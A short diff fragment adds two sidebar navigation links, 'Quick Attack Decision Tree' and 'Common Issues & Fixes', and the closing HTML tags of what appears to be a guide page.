+<a href="#quick-attack-decision-tree" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Quick Attack Decision Tree</a>
+<a href="#common-issues-fixes" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Common Issues & Fixes</a>
+
+      </div>`,
+    });
+  </script>
+</body>
+
+</html>
